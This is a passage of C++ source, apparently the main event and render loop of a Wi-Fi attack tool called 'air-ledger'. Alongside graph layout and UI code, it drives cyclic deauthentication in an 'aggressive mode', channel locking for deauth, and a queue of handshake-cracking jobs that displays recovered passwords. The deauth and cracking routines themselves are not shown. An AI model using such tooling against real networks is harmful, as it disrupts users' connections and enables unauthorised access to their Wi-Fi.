                    if (sym == SDLK_t)      { toggle_auto_crack(); }
                    if (sym == SDLK_g)      { toggle_aggressive_mode(); }
                    if (sym == SDLK_e)      { export_json(selected_node); }
                    if (sym == SDLK_SLASH) { start_search(); }
                    if (sym == SDLK_i)     { graph_view_.toggle_help(); }
                    if (sym == SDLK_w)     { graph_view_.toggle_anomaly_log(); }
                    if (sym == SDLK_y)     { graph_view_.toggle_event_log(); }
                    if (sym == SDLK_SPACE) { graph_view_.help_page_next(); }
                    // Camera controls
                    if (sym == SDLK_z)      { graph_view_.zoom_center(1.15f); }
                    if (sym == SDLK_x)      { graph_view_.zoom_center(1.0f / 1.15f); }
                    if (sym == SDLK_0 || sym == SDLK_KP_0) { graph_view_.fit_view(graph_); }
                    {
                        bool shift = (ev.key.keysym.mod & KMOD_SHIFT) != 0;
                        if (sym == SDLK_UP)    { shift ? sidebar_.scroll_up()   : graph_view_.pan_keyboard(0.0f,  80.0f); }
                        if (sym == SDLK_DOWN)  { shift ? sidebar_.scroll_down() : graph_view_.pan_keyboard(0.0f, -80.0f); }
                        if (sym == SDLK_LEFT)  { graph_view_.pan_keyboard( 80.0f, 0.0f); }
                        if (sym == SDLK_RIGHT) { graph_view_.pan_keyboard(-80.0f, 0.0f); }
                    }
                }
            }

            if (!startup_dialog_open_)
                graph_view_.handle_event(ev);
        }

        // Update selected node from graph view
        selected_node = graph_view_.selected_node();

        // Reset sidebar scroll on selection change
        if (selected_node != prev_selected_) {
            sidebar_.reset_scroll();
            // Update AP focus: force-show active clients of selected AP
            const Node* sn = graph_.get_node(selected_node);
            graph_view_.set_ap_focus((sn && sn->type == NodeType::AP) ? selected_node : 0);
        }

        // Auto-lock channel when selection changes (works with hopping on OR off)
        if (selected_node != prev_selected_) {
            prev_selected_ = selected_node;
            // Only apply if no active deauth lock (deauth lock has priority)
            if (deauth_ch_unlock_us_ == 0)
                apply_selection_channel_lock(selected_node);
        }

        // Release deauth channel lock when timer expires, restore selection lock
        if (deauth_ch_unlock_us_ != 0 && now_us() >= deauth_ch_unlock_us_) {
            deauth_ch_unlock_us_ = 0;
            apply_selection_channel_lock(selected_node);
            std::fprintf(stderr, "[app] deauth channel lock released\n");
        }

        // Process new captured frames
        process_pending_frames();

        // Persist any new nodes immediately so none are lost on crash/exit
        {
            size_t cur = graph_.nodes().size();
            if (cur > last_saved_node_count_) {
                db_.save_graph(graph_);
                last_saved_node_count_ = cur;
            }
        }

        // Periodic analytics
        uint64_t now = now_us();
        if (now - last_iface_diag_us_ > 1'000'000ULL) {
            update_iface_diagnostics();
            last_iface_diag_us_ = now;
        }
        if (now - last_analytics_us_ > ANALYTICS_INTERVAL_US) {
            run_analytics();
            last_analytics_us_ = now;
        }

        // Periodic DB flush
        if (now - last_db_flush_us_ > DB_FLUSH_INTERVAL_US) {
            db_.flush_batch();
            last_db_flush_us_ = now;
        }

        // Periodic active-mark
        if (now - last_active_mark_us_ > ACTIVE_MARK_INTERVAL_US) {
            graph_.mark_active(now);
            last_active_mark_us_ = now;
        }

        // On weak devices, stale clients quickly dominate both render and layout.
        // Drop inactive client nodes from the in-memory graph after 5 minutes.
        if (now - last_prune_us > PRUNE_INTERVAL_US) {
            bool small_device_mode = is_beepy_profile(ui_profile_) || graph_.nodes().size() > 800;
            if (small_device_mode) {
                size_t removed = graph_.prune_stale_clients(now, 300'000'000ULL, selected_node);
                if (removed > 0) {
                    std::fprintf(stderr, "[graph] pruned stale clients: %zu\n", removed);
                    if (last_saved_node_count_ > graph_.nodes().size())
                        last_saved_node_count_ = graph_.nodes().size();
                    push_notice("Pruned stale clients: " + std::to_string(removed), 3'000'000ULL);
                }
            }
            last_prune_us = now;
        }

        // Layout step — skip every other frame when graph is large (O(n²) repulsion)
        {
            static int layout_skip = 0;
            int n_nodes = static_cast<int>(graph_.nodes().size());
            int skip_mod = (n_nodes > 150) ? 3 : (n_nodes > 60) ? 2 : 1;
            if (++layout_skip >= skip_mod) { layout_skip = 0; layout_.update(graph_.nodes(), graph_.edges()); }
        }

        // Seed drag position on the first frame so node doesn't snap to (0,0)
        if (graph_view_.drag_just_started() && selected_node != 0) {
            Node* n = graph_.get_node(selected_node);
            if (n) graph_view_.init_drag_pos(n->x, n->y);
        }

        // Sync dragged node position into graph and layout pin
        if (graph_view_.is_dragging() && selected_node != 0) {
            Node* n = graph_.get_node(selected_node);
            if (n) { n->x = graph_view_.drag_x(); n->y = graph_view_.drag_y(); }
            layout_.pin(selected_node, graph_view_.drag_x(), graph_view_.drag_y());
        }

        // On drag release: zero out velocity so node doesn't fly off
        if (prev_dragging_ && !graph_view_.is_dragging() && selected_node != 0) {
            Node* n = graph_.get_node(selected_node);
            if (n) { n->vx = 0; n->vy = 0; }
        }
        prev_dragging_ = graph_view_.is_dragging();

        // Expire old notifications
        {
            uint64_t t = now_us();
            notifications_.erase(
                std::remove_if(notifications_.begin(), notifications_.end(),
                               [t](const AppNotif& n){ return t > n.until_us; }),
                notifications_.end());
        }

        // Aggressive mode: cyclic deauth
        tick_aggressive_mode();

        // Tick crack spinners every ~300ms
        {
            static uint64_t last_spin_us = 0;
            if (now - last_spin_us > 300'000ULL) {
                handshake_saver_.tick_spinners();
                last_spin_us = now;
            }
        }

        // Pass current filter, counters and crack status to graph view before render
        graph_view_.set_filter(filter_);
        graph_view_.set_pw_count(pw_count_);
        graph_view_.set_anomaly_log(anomaly_log_);
        graph_view_.set_event_log(event_log_);
        {
            auto cs = handshake_saver_.current_crack_status();
            graph_view_.set_crack_info({cs.ssid, cs.speed_kps, aggressive_mode_, aggr_target_label_, cs.engine_label});
        }

        // Build crack list entries for overlay; also update Node crack_running/crack_speed_kps
        {
            // First clear crack_running on all AP nodes so stale state doesn't linger
            for (auto& [id, n] : graph_.nodes()) {
                if (n.type == NodeType::AP) {
                    n.crack_running   = false;
                    n.crack_speed_kps = 0;
                }
            }

            std::vector<GraphView::CrackListEntry> entries;
            entries.reserve(handshake_saver_.crack_jobs().size());
            for (const auto& j : handshake_saver_.crack_jobs()) {
                GraphView::CrackListEntry e;
                e.bssid           = j.bssid;
                e.ssid            = j.ssid;
                e.handshake_count = j.handshake_count;
                e.spin_frame      = j.spin_frame;
                e.password        = j.password;
                e.speed_kps       = j.cached_speed_kps;
                using JS = CrackJob::Status;
                using ES = GraphView::CrackListEntry::Status;
                switch (j.status) {
                    case JS::Queued:   e.status = ES::Queued;   break;
                    case JS::Running:  e.status = ES::Running;  break;
                    case JS::Found:    e.status = ES::Found;    break;
                    case JS::NotFound: e.status = ES::NotFound; break;
                }
                entries.push_back(std::move(e));

                // Propagate active crack state to graph node
                if (j.status == JS::Queued || j.status == JS::Running) {
                    for (auto& [id, n] : graph_.nodes()) {
                        if (n.type == NodeType::AP && n.label == j.bssid) {
                            n.crack_running   = true;
                            n.crack_speed_kps = j.cached_speed_kps;
                            n.crack_not_found = false; // clear stale "not found" while new attempt runs
                            break;
                        }
                    }
                }
            }
            graph_view_.set_crack_list(entries);
        }
        {
            const Node* sn = graph_.get_node(selected_node);
            bool can_deauth = sn && sn->type == NodeType::AP;
            bool deauth_flash = now_us() < deauth_flash_until_us_;
            graph_view_.set_deauth_state(can_deauth, deauth_flash);
        }
        {
            std::vector<GraphView::Notification> gnotifs;
            for (auto& n : notifications_)
                gnotifs.push_back({n.text, n.is_error
                    ? SDL_Color{255,  60,  60, 255}   // red = error
                    : SDL_Color{  0, 255, 100, 255}}); // green = info/success
            graph_view_.set_notifications(gnotifs);
        }

        // Update window title — always show hop state
        {
            char title[96];
            if (hopping_enabled_ && hopper_) {
                std::snprintf(title, sizeof(title), "air-ledger  ch:%d  dwell:%dms  frames:%llu",
                              hopper_->current_channel(), hop_dwell_ms_,
                              static_cast<unsigned long long>(total_frames_));
            } else {
                std::snprintf(title, sizeof(title),
                              "air-ledger  HOP:OFF (press H)  frames:%llu",
                              static_cast<unsigned long long>(total_frames_));
            }
            SDL_SetWindowTitle(window_, title);
        }

        // Render
        SDL_SetRenderDrawColor(renderer_, 0, 0, 0, 255);
        SDL_RenderClear(renderer_);

        int graph_w = cur_w - sidebar_w_;
        graph_view_.render(graph_, graph_w, cur_h);
        // When AP list is open, show info for the highlighted AP in sidebar
        NodeId sidebar_node = graph_view_.sidebar_focus_node(graph_);
        if (sidebar_node == 0) sidebar_node = selected_node;
        sidebar_.render(graph_, sidebar_node, graph_w, sidebar_w_, cur_h,
                        filter_, alias_mode_, alias_buf_, alias_target_,
                        total_frames_, stats_beacon_, stats_probe_req_,
                        hopping_enabled_,
                        hopper_ ? hopper_->current_channel() : 0,
                        hop_dwell_ms_,
                        search_mode_,
                        hopper_ ? hopper_->has_5ghz()        : false,
                        hopper_ ? hopper_->channel_count()   : 0,
                        hopper_ ? hopper_->is_locked()        : false,
                        hopper_ ? hopper_->locked_channel()   : 0);

        // Sticky action bar with active hotkeys + live iface diagnostics
        render_action_bar(cur_w, cur_h);

        // Startup diagnostic overlay — drawn on top of everything
        if (startup_dialog_open_)
            render_startup_dialog(cur_w, cur_h);

        SDL_RenderPresent(renderer_);
        SDL_UpdateWindowSurface(window_);

        // Cap to ~30 FPS
        uint64_t elapsed = now_us() - frame_start;
        if (elapsed < FRAME_US) {
            uint32_t sleep_ms = static_cast<uint32_t>((FRAME_US - elapsed) / 1000);
            if (sleep_ms > 0) SDL_Delay(sleep_ms);
        }
    }
}
